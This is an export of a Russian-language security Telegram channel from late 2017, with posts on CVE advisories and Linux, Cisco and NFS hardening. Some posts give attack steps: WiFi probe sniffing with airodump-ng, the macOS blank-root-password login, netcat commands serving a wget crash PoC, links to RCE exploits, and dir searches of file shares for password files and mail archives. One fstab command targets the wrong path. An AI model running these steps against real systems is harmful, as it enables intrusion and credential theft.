      </div>

      <div class="body">

       <div class="pull_right date details" title="23.11.2017 11:36:41">
11:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Intel обнаружила 10 серьезных уязвимостей в системах Management Engine (ME), Trusted Execution Engine (TXE) и Server Platform Services (SPS).<br><br>Intel ME состоит из микроконтроллера, который работает с чипом семейства микросхем Platform Controller Hub (PCH), в сочетании с интегрированными периферийными устройствами. Он обрабатывает большую часть данных, перемещаемых между процессором и внешними устройствами, и, таким образом, имеет доступ к большинству данных на хост-компьютере. У него свой CPU и своя ОС, которые находятся вне поля зрения ОС компьютера, его антивирусов и других программ.<br><br>SPS базируется на ME и позволяет удаленно конфигурировать сервера через сеть. TXE представляет собой технологию аутентификации аппаратуры.<br><br>В список аппаратных компонентов, где присутствуют описанные уязвимости, вошли процессоры Intel Core шестого, седьмого и восьмого поколения, Intel Xeon E3-1200 v5 и v6, Intel Xeon Scalable, Intel Xeon W, Intel Atom C3000, серия Apollo Lake Intel Atom E3900, семейство Apollo Lake Intel Pentium, а также серии Celeron N и J.<br><br>Уязвимостям, найденным в ME, были присвоены названия CVE-2017-5705, CVE-2017-5708, CVE-2017-5711, CVE-2017-5712, CVE-2017-5711 и CVE-2017-5712. Уязвимости в SPS получили номера CVE-2017-5706 и CVE-2017-5709. Уязвимости в TXE называются CVE-2017-5707 и CVE-2017-5710.<br><br>Чтобы узнать, присутствуют ли эти уязвимости, можно использовать выпущенный производителем инструмент Intel-SA-00086 <a href="https://downloadcenter.intel.com/download/27150">https://downloadcenter.intel.com/download/27150</a>.<br><br>Если уязвимости обнаружиись, придется ждать обновления прошивки. Intel поясняет, что необходимый код уже написан, но требует подписей вендоров. Lenovo уже справилась с задачей, ее обновления можно получить на сайте поддержки.
       </div>

      </div>

     </div>

     <div class="message service" id="message-55">

      <div class="body details">
24 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message62">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="24.11.2017 12:53:52">
12:53
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Хакеры крайне любят подделывать точки доступа WiFi. Когда еду в метро, всегда смотрю, не сидит ли в вагоне кто-то подозрительный со смартфоном. Но на самом деле проще не пользоваться критичными сервисами.<br><br>Подделать точку доступа можно легко, если на клиенте настроено автоматическое подключение к каким-либо сетям. Особенно открытым. Особенно опасна в этом смысле MT_FREE.<br><br>Посмотрим, кто у нас хочет куда-то подключиться.<br><br><code>ifconfig wlan0 down</code><br><code>iwconfig wlan0 mode monitor</code><br><code>ifconfig wlan0 up</code><br><code>airodump-ng</code><br><br>В последнем столбце для клиентов (Probes) видны списки сетей, к которым желает подключиться устройство. Вот эти устройства и находятся в зоне риска подключения к поддельным сетям (хотя можно подделать и ту точку доступа, к которой устройство подключают вручную).<br><br>Чтобы снизить риск, желательно не устанавливать автоматическое подключение к WiFi сетям.
       </div>

      </div>

     </div>

     <div class="message service" id="message-56">

      <div class="body details">
27 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message63">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.11.2017 11:03:56">
11:03
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В прошивке ряда моделей принтеров Hewlett Packard (HP) обнаружена уязвимость, позволяющая атакующему удаленно выполнить произвольный код на уязвимых устройствах. Проблема затрагивает в общей сложности 54 модели принтеров – от HP LaserJet Enterprise, LaserJet Managed и PageWide Enterprise до OfficeJet Enterprise. Точный перечень уязвимых моделей и пропатченных прошивок можно посмотреть здесь <a href="https://support.hp.com/nz-en/document/c05839270">https://support.hp.com/nz-en/document/c05839270</a>.<br><br>Для тех, кто не так давно с нами, напомню, что хакер может получить, поломав принтер:<br>  - Учетные данные подключения к LDAP или почте<br>  - Список почтовых адресов<br>  - Документы<br>  - Точку для распространения атаки<br>  <br>HP уже выпустила апдейты для уязвимых моделей. Их можно скачать здесь <a href="https://support.hp.com/ru-ru/drivers">https://support.hp.com/ru-ru/drivers</a> по модели принтера.
       </div>

      </div>

     </div>

     <div class="message service" id="message-57">

      <div class="body details">
28 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message64">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.11.2017 13:32:24">
13:32
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В Cisco IOS есть три уровня шифрования паролей в конфигурационном файле: 0, 7 и 5.<br>0 - это пароли в открытом виде<br>7 - слабый проприетарный обратимый алгоритм шифрования<br>5 - хеш MD5<br><br>Ряд паролей по умолчанию сохраняется в открытом виде:<br>- Пароль к локальной консоли<br>- Пароли к виртуальным терминалам<br>- Пароль к enable, если использовалась команда enable password<br>- Пароли RIP2, EIGRP, BGP, OSPF и IS-IS-I<br><br>Если вы храните копии конфигурации в доступных пользователям местах или передаете, например, на аудит, пароли определенно должны быть зашифрованы, и как можно лучше.<br><br>Чтобы зашифровать открытые пароли в конфигурационном файле нужно использовать команду:<br><br><code>(config)#service password-encryption</code><br><br>Все пароли, для которых поддерживается уровень 5, должны использовать только уровень 5, так как уровень 7 расшифровывается множеством тулз за секунды. Для этого используем команды:<br><br><code>enable secret &lt;password&gt;</code><br><code>username &lt;user&gt; secret &lt;password&gt;</code><br><br>Даже если все ваши пароли зашифрованы, конфигурационными файлами лучше не разбрасываться, с контрагентами подписывать NDA, а резервные копии хранить только на отдельном выделенном хосте, к которому есть доступ только у сетевых администраторов.
       </div>

      </div>

     </div>

     <div class="message service" id="message-58">

      <div class="body details">
29 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message65">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="29.11.2017 10:54:31">
10:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Характерная картина: если в сети есть экспортные файловые системы NFS, то они доступны без аутентификации. И часто с любого хоста. Косяк.<br><br>NFSv2 и NFSv3 предоставляют доступ на основании адреса или имени запрашивающего хоста и не поддерживают аутентификацию по имени пользователя. Поэтому строго рекомендуется использовать NFSv4.<br><br>После подключения шары права пользователей определяются их UID на удаленной машине, если хакер является рутом на ней, он может получить доступ к любым файлам.<br><br>По умолчанию шары экспортируются со свойством root_squashing, что превращает удаленного рута в локального nfsnobody с целью ограничения его прав. Также доступна опция all_squash, которая поступит так с любым удаленным пользователем, но ее надо включать явно.<br><br><strong>Рассмотрим настройку NSFv4 на примере RedHat/CentOS.</strong><br><br>Для установки сервера NFSv4 понадобится три пакета: nfs-utils, portmap и nfs4-acl-tools. Файл /etc/exports настраивается как обычно, только добавляется опция подключения <code>sec=krb5</code>.<br><br>Для аутентификации с помощью Kerberos надо настроить сервер Kerberos и базы пользователей. На сервере:<br><br>yum update &amp;&amp; yum install krb5-server krb5-workstation pam_krb5<br><code>kdb5_util create -s</code><br><code>systemctl start krb5kdc kadmin nfs-secure</code>  <br><code>systemctl enable krb5kdc kadmin nfs-secure</code><br><code>kadmin.local</code><br><code>&gt; addprinc root/admin</code><br><code>&gt; addprinc -randkey host/client.mydomain.com</code><br><code>&gt; addprinc -randkey nfs/client.mydomain.com</code><br><code>&gt; addprinc -randkey nfs/server.mydomain.com</code><br><code>&gt; quit</code><br><code>kinit root/admin</code><br><code>kadmin.local</code><br><code>&gt; ktadd host/client.mydomain.com</code><br><code>&gt; ktadd nfs/client.mydomain.com</code><br><code>&gt; ktadd nfs/server.mydomain.com</code><br><code>&gt; quit</code><br><br>На клиенте:<br><br><code>yum update &amp;&amp; yum install krb5-workstation pam_krb5</code><br><code>kdb5_util create -s</code><br><code>systemctl start krb5kdc kadmin nfs-secure</code><br><code>systemctl enable krb5kdc kadmin nfs-secure</code><br><code>kadmin.local</code><br><code>&gt; addprinc root/admin</code><br><code>&gt; addprinc -randkey host/client.mydomain.com</code><br><code>&gt; addprinc -randkey nfs/client.mydomain.com</code><br><code>&gt; addprinc -randkey nfs/server.mydomain.com</code><br><code>&gt; quit</code><br><code>kinit root/admin</code><br><br>После этого можно подключаться с клиента на сервер по NFSv4 с Kerberos аутентификацией.
       </div>

      </div>

     </div>

     <div class="message service" id="message-59">

      <div class="body details">
30 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message66">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.11.2017 12:21:29">
12:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
PowerDNS — высокопроизводительный DNS-сервер, написанный на C++ и лицензируемый под лицензией GPL. Используется миллионами.<br><br>На днях в нем нашли ряд уязвимостей: CVE-2017-15090, CVE-2017-15091, CVE-2017-15092, CVE-2017-15093, CVE-2017-15094. Уязвимости позволяют подделать записи DNS, вызвать отказ в осблуживании, утечку памяти, модифицировать веб-интерфейс или изменить конфигурацию.<br><br>Уязвимости устранены в последних выпущенных производителем версиях: PowerDNS Authoritative Server 4.0.5 и Recursor 4.0.7. Нужно обновляться.
       </div>

      </div>

     </div>

     <div class="message service" id="message-60">

      <div class="body details">
1 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message67">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="01.12.2017 11:33:59">
11:33
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Exim - один из лидирующих мейл-серверов для Linux/Unix, который используется во многих компаниях. Не так давно в нем были обнаружены новые уязвимости CVE-2017-16943 и CVE-2017-16944.<br><br>Уязвимости основываются на использовании освобожденной памяти в функции обработки chunked запросов, а именно команд BDAT. Chunking - это метод отправления сообщения, разбитого на части, например, чтобы указать различную кодировку, а команды BDAT указывают начало и конец частей сообщения.<br><br>Уязвимость CVE-2017-16943 потенциально позволяет выполнить произвольный код в процессе сервера и оценена как критическая. Уязвимость CVE-2017-16944 - это возможность вызова отказа в обслуживании.<br><br>Владельцы Exim могут обновиться до версии 4.90, чтобы закрыть эти уязвимости.
       </div>

      </div>

     </div>

     <div class="message service" id="message-61">

      <div class="body details">
4 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message68">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="04.12.2017 11:57:12">
11:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Забавный баг нашли в macOS High Sierra (10.13.0, 10.13.1, бета 10.13.2). Любой пользователь может получить права рута. Для эксплуатации нужно зайти в System Preferences -&gt; Users &amp; Groups, кликнуть на иконку замка, а затем ввести логин &quot;root&quot;, оставить поле ввода пароля пустым и несколько раз нажать Enter. После этого активируется учетная запись рута с пустым паролем, под которой можно залогиниться как локально, так и удаленно.<br><br>Apple выпустила патч для бага Security Update 2017-001 <a href="https://support.apple.com/en-us/HT208315">https://support.apple.com/en-us/HT208315</a>. Другой способ защиты - задать ненулевой пароль для рута, чтобы заблокировать возможность его активации с пустым паролем.
       </div>

      </div>

     </div>

     <div class="message service" id="message-62">

      <div class="body details">
5 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message69">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.12.2017 11:52:44">
11:52
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Свеженькие уязвимости в популярнейшей утилите wget. Да не простые, а RCE!<br><br>Proof of concept можно скачать здесь <a href="https://raw.githubusercontent.com/r1b/CVE-2017-13089/master/src/exploit/payload">https://raw.githubusercontent.com/r1b/CVE-2017-13089/master/src/exploit/payload</a> и запустить веселия ради с помощью netcat:<br><br><code>nc -lp 1337 &lt; payload &amp;</code><br><code>wget --debug localhost:1337</code><br><br>После чего wget просто крашнется.<br><br>Ну а RCE реализуется, например, этим пэйлоадом <a href="https://github.com/mzeyong/CVE-2017-13089/blob/master/shellcode.py">https://github.com/mzeyong/CVE-2017-13089/blob/master/shellcode.py</a>.<br><br>Уязвимости пофикшены в новой версии wget 1.19.2, которая уже доступна.
       </div>

      </div>

     </div>

     <div class="message service" id="message-63">

      <div class="body details">
6 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message70">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.12.2017 11:38:34">
11:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
TeamViewer - крайне популярная альтернатива RDP, SSH и VNC, как для Windows, так и для Mac OS и Linux. Вчера команда разработки выпустила срочное обновление, устраняющее значительную уязвимость. <br><br>Уязвимость позволяет пользователю, к компьютеру которого подключаются по TeamViewer, свичнуть сессию и получить доступ к компьютеру, с которого происходит подключение, причем незаметно для пользователя того компа.<br><br>Для эксплуатации уязвимости пользователи должны сначала пройти аутентификацию. Затем с помощью DLL-инжектора атакующий должен внедрить в их процессы вредоносный код. Как только код вводится в процесс, он запрограммирован на изменение значений памяти в вашем собственном процессе, благодаря чему включаются элементы GUI, позволяющие переключать управление сеансом. Когда вы делаете запрос на переключение сторон, со стороны сервера нет никаких дополнительных проверок.<br><br>Второе следствие уязвимости - клиент сессии TeamViewer может управлять мышкой на целевом компьютере независимо от выставленных на нем ограничений.<br><br>Демонстрацию эксплуатации уязвимости можно посмотреть здесь <a href="https://github.com/gellin/TeamViewer_Permissions_Hook_V1">https://github.com/gellin/TeamViewer_Permissions_Hook_V1</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-64">

      <div class="body details">
7 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message71">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.12.2017 12:06:05">
12:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Один из основных столпов практической безопасности - аудит событий. Без него просто немыслим разбор инцидентов и проведение криминалистических исследований. Не говоря уже о просто нарушении политик безопасности.<br><br>В Linux, помимо встроенного syslog и его усовершенствованных последователей, есть демон auditd, специально заточенный на регистрацию событий, связанных с различными видами доступа. Установить auditd можно начиная с ядра 2.6 в любом дистрибутиве.<br><br><strong>Auditd</strong> позволяет вести слежение за такими событиями, как:<br>- Запуск и завершение работы системы (перезагрузка, остановка);<br>- Чтение/запись или изменение прав доступа к файлам;<br>- Инициация сетевого соединения или изменение сетевых настроек;<br>- Изменение информации о пользователе или группе;<br>- Изменение даты и времени;<br>- Запуск и остановка приложений;<br>- Выполнение системных вызовов.<br><br>Одна из фич auditd - запуск уже вместе с ядром. Для того, чтобы его активировать, нужно добавить опцию <code>audit=1</code> в параметры загрузчика.<br><br>При установке auditd не регистрирует ничего. Для его работы требуется настроить правила в файле /etc/audit/audit.rules. К счастью эксперты по безопасности составили рекомендуемый набор правил, который позволит отслеживать доступ ко всем значимым дефолтным функциям системы. Списки правил приводятся тут <a href="http://telegra.ph/Rekomenduemye-pravila-dlya-auditd-12-07">http://telegra.ph/Rekomenduemye-pravila-dlya-auditd-12-07</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-65">

      <div class="body details">
8 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message72">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="08.12.2017 11:48:45">
11:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
CVE-2017-8759 в .NET Framework (версии 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 и 4.7). Уязвимость позволяет выполнить произвольны код на атакуемой системе. Куча готовых эксплойтов доступно, например, <a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a>, <a href="https://github.com/nccgroup/CVE-2017-8759">https://github.com/nccgroup/CVE-2017-8759</a>, а также уязвимость используется вредоносным ПО, в частности, FinSpy.<br><br>Вредоносный код встраивается в документы MS Word и выполняется в случае, когда пользователь открывает файл для просмотра на уязвимом узле. В результате этого действия атакующий получает полный контроль над атакуемой системой и может выполнять любые действия на компьютере жертвы.<br><br>Необходимый KB зависит от версии системы и .NET Framework, полный список приводится тут <a href="https://blogs.msdn.microsoft.com/dotnet/2017/09/12/net-framework-september-2017-security-and-quality-rollup/">https://blogs.msdn.microsoft.com/dotnet/2017/09/12/net-framework-september-2017-security-and-quality-rollup/</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-66">

      <div class="body details">
11 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message73">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.12.2017 13:48:30">
13:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В движке Malware Protection Engine (MPE) от Microsoft выявлена критическая уязвимость CVE-2017-11937.<br><br>Эксплуатация уязвимости производится с помощью специально сформированного файла при сканировании его MPE. В результате происходит повреждение памяти и атакующий может удаленно выполнить произвольный код на целевой машине с правами LocalSystem. Особая драма тут в том, что пользователю не требуется никак открывать файл, достаточно, чтобы он оказался расположенным в локации, сканируемой MPE.<br><br>Движок MPE входит в Windows Defender, Microsoft Security Essentials, Endpoint Protection, Forefront Endpoint Protection, Exchange Server 2013 и 2016 в Windows 7, Windows 8.1, Windows 10, Windows RT 8.1 и Windows Server. Все эти продукты требуют срочного обновления, Microsoft его уже выпустила.
       </div>

      </div>

     </div>

     <div class="message service" id="message-67">

      <div class="body details">
12 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message74">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.12.2017 13:09:19">
13:09
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В ноутбуках HP в очередной раз нашли кейлоггер. <br><br>Его код встроен в файл SynTP.sys, являющемся частью драйвера Synaptics Touchpad. Разработчики честно признали его наличие и обозначили как отладочную функцию, которую забыли удалить.<br><br>По умолчанию кейлоггер не активен. Его можно запустить путем модификации ключей реестра HKLM\Software\Synaptics\%ProductName% или HKLM\Software\Synaptics\%ProductName%\Default, где %ProductName% - это SynTP или PointerPort. Из этих ключей драйвер получает маску, определяющую, в частности, включена ли функция отладки. При активации кейлоггера его трейсы сохраняются локально в формате WPP (Windows software trace preprocessor).<br><br>Подверженные модели: 25*, mt**, 15*, OMEN, ENVY, Pavilion, Stream, ZBook, EliteBook, ProBook, некоторые Compaq. Полный список конкретных моделей и патчи можно найти здесь <a href="https://support.hp.com/us-en/document/c05827409">https://support.hp.com/us-en/document/c05827409</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-68">

      <div class="body details">
13 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message75">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.12.2017 12:04:12">
12:04
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Во избежание переполнения файловой системы в Linux директории, к которым у многих пользователей, в том числе у внешних, есть доступ, рекомендуется создавать на отдельных разделах. Это <a href="" onclick="return ShowBotCommand(&quot;tmp&quot;)">/tmp</a>, <a href="" onclick="return ShowBotCommand(&quot;var&quot;)">/var</a>, /var/log, /var/log/audit и <a href="" onclick="return ShowBotCommand(&quot;home&quot;)">/home</a>. Это легко сделать при установке новой системы и рекомендуется делать всегда. Ну а при потребности избежать риска переполнения на уже работающей системе можно переразбить разделы и выделить новый для опасной директории.<br><br>После этого полезно добавить опции монтирования, ограничивающие опасный функционал у пользовательских файлов. Опции монтирования задаются в 4 столбце в файле /etc/fstab.<br><br>Для <a href="" onclick="return ShowBotCommand(&quot;tmp&quot;)">/tmp</a> рекомендуются опции nodev (запрещает создавать в файловой системе файлы устройств), noexec (запрещает запускать исполняемые файлы) и nosuid (запрещает создавать файлы с SUID/SGID битами):<br><br><code>grep &quot;[[:space:]]/tmp[[:space:]]&quot; /etc/fstab | grep nodev | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/tmp\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nodev\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/tmp[[:space:]]&quot; /etc/fstab | grep nosuid | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/tmp\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nosuid\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/tmp[[:space:]]&quot; /etc/fstab | grep noexec | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/tmp\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,noexec\2&quot;g&apos; /etc/fstab</code><br><code>mount -o remount,noexec,nodev,nosuid /tmp</code><br><br>В точках монтирования /var/log и /var/log/audit хранятся журналы регистрации событий и им тоже не помешают опции nodev, noexec и nosuid:<br><br><code>grep &quot;[[:space:]]/var/log[[:space:]]&quot; /etc/fstab | grep nodev | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/var/log\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nodev\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/var/log[[:space:]]&quot; /etc/fstab | grep nosuid | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/tmp\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nosuid\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/var/log[[:space:]]&quot; /etc/fstab | grep noexec | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/var/log\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,noexec\2&quot;g&apos; /etc/fstab</code><br><code>mount -o remount,noexec,nodev,nosuid /var/log</code><br><code>grep &quot;[[:space:]]/var/log/audit[[:space:]]&quot; /etc/fstab | grep nodev | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/var/log/audit\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nodev\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/var/log/audit[[:space:]]&quot; /etc/fstab | grep nosuid | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/var/log/audit\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nosuid\2&quot;g&apos; /etc/fstab</code><br><code>grep &quot;[[:space:]]/var/log/audit[[:space:]]&quot; /etc/fstab | grep noexec | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/var/log/audit\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,noexec\2&quot;g&apos; /etc/fstab</code><br><code>mount -o remount,noexec,nodev,nosuid /var/log/audit</code><br><br>Для <a href="" onclick="return ShowBotCommand(&quot;home&quot;)">/home</a> рекомендуется опция nodev:<br><br><code>grep &quot;[[:space:]]/home[[:space:]]&quot; /etc/fstab | grep nodev  | grep ^[^#] || sed -i &apos;s&quot;^\(.*\s/home\s\+\w\+\s\+[a-zA-Z0-9,]\+\)\(\s.*\)$&quot;\1,nodev\2&quot;g&apos; /etc/fstab</code><br><code>mount -o remount,nodev /home</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-69">

      <div class="body details">
14 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message76">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.12.2017 11:50:08">
11:50
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Номер CVE-2017-13156 и имя Janus получила не так давно опубликованная уязвимость в Android. Затрагивает она версии 5.0 и выше. Уязвимость позволяет внедрить в APK-приложение произвольный (в том числе вредоносный) код, не повредив цифровую подпись, удостоверяющую приложение.<br><br>Внедрение возможно, если используется схема подписи APK приложений v1. В таком случае для проверки целостности Android довольно бегло проверяет байты только в некоторых местах. Расположение этих байтов отличается для файлов APK и DEX, и файл DEX может быть внедрен внутрь APK. При этом операционная система будет уверена, что по-прежнему работает с оригинальной версией APK, а подпись в файле все еще будет определяться как правильная, так как не изменятся те байты, по которым она проверяется.<br><br>Внедренный код получит все права и привилегии оригинального приложения. А пользователь не заметит никаких странностей, так как приложение будет работать как обычно.<br><br>Рекомендации по защите от атаки с помощью этой уязвимости: для пользователей - не устанавливать сомнительные приложения и приложения из сомнительных источников, а для разработчиков - использовать схему подписи v2.<br><br>P.S. Теперь мне можно писать на <a href="https://t.me/Li11ian">@Li11ian</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-70">

      <div class="body details">
15 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message77">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.12.2017 11:54:20">
11:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Сложно представить работу коллектива без общей сетевой шары. И частенько на ней есть личные папки пользователей. Вот только права на них не всегда даны только этому пользователю. Да и вообще, выкладывать пароли на шару в открытом виде - бред какой-то. А мне случалось находить целые коллекции паролей, к которым был доступ у всех доменных пользователей.<br><br>Итак, допустим у нас шара примонтирована на W:. Процесс поиска подозрительных файлов долгий, поэтому пишем результаты в файл, а смотрим в понедельник.<br><br><code>W:</code><br><code>cd\</code><br><code>dir /S *pass* *парол* &gt;&gt; C:\Temp\pass_search.txt</code><br><br>Набрали, значит, файлов, просматриваем, ищем подозрительные, проверяем, что в них. Находим пароли, ругаем нерадивых пользователей =)<br><br>До кучи можно посмотреть файлы вида:<br><br><code>dir /S 1.txt my.txt key.* login.* доступ.* &gt;&gt; C:\Temp\pass_search.txt</code><br><br>Eще можно совсем обнаглеть и проверить рабочие станции пользователей. А нечего пароли в открытом виде хранить! KeePass есть на это.<br><br>А если совсем уж делать нечего, можно поискать почтовые архивы и логи с интересной информацией:<br><br><code>dir /S *.pst *log* &gt;&gt; C:\Temp\i_have_too_much_free_time.txt</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-71">

      <div class="body details">
18 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message78">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.12.2017 12:02:53">
12:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Атака ROBOT прославилась тем, что ей оказались подвержены такие гиганты, как Facebook и PayPal.<br><br>Вкратце, атака при определенных условиях позволяет получить закрытый сессионный ключ TLS-сессии и дешифровать сообщения. Причем сделать это можно и после закрытия сессии, записав шифрованные пакеты на будущее.<br><br>Причина уязвимости кроется в недостаточно корректном устранении старой, 19-летней давности уязвимости в протоколе TLS, а также в неточной реализации раздела <a href="7.4.7.1">7.4.7.1</a> (RFC 5246) стандарта TLS в продуктах.<br><br>Проблема исключительно серверная, со стороны клиента нет ни уязвимости, ни возможности защититься.<br><br>Перечень уязвимых продуктов можно посмотреть здесь <a href="http://www.kb.cert.org/vuls/byvendor?searchview&amp;Query=FIELD+Reference=144389&amp;SearchOrder=4">http://www.kb.cert.org/vuls/byvendor?searchview&amp;Query=FIELD+Reference=144389&amp;SearchOrder=4</a>.<br><br>На сайте атаки нам любезно приготовили возможность проверить свой сайт на наличие уязвимости <a href="https://robotattack.org/#check">https://robotattack.org/#check</a>.<br><br>Уязвимости подвержены только наборы криптографических алгоритмов с использование RSA. Если используются шифры на эллиптических кривых - атака невозможна.
       </div>

      </div>

     </div>

     <div class="message service" id="message-72">

      <div class="body details">
19 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message79">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.12.2017 12:14:20">
12:14
       </div>

